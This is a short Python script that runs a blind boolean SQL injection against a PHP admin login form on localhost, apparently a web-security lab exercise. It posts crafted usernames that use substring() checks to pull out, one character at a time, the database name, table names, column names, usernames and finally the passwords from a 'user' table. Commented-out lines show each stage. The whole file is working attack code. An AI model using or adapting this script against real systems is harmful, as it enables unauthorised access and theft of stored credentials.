import requests
import sys

url = 'http://localhost/web_security/blog/admin_login.php'

for i in range(1, 20):
    for c in range(0x20, 0x7f):
        # username = "xyz' OR BINARY substring(database(), '%x',1)='%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='blog'), '%x',1)='%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA='blog' AND TABLE_NAME='user'), '%x',1)='%s' -- " % (i, chr(c))
        # username = "xyz' OR BINARY substring((SELECT GROUP_CONCAT(username) FROM user), '%x',1)='%s' -- " % (i, chr(c))
        username = "xyz' OR BINARY substring((SELECT GROUP_CONCAT(password) FROM user), '%x',1)='%s' -- " % (i, chr(c))

        password = 12345

        form = {'username': username, 'password': password,  'submit': 'submit' }

        response = requests.post(url, data=form)
        if "Halaman administrasi blog" in response.text:
            status = True
        elif "Username atau password salah!" in response.text:
            status = False

        if status:
            # print(chr(c))
            sys.stdout.write(chr(c))
            sys.stdout.flush()
            break
print('')
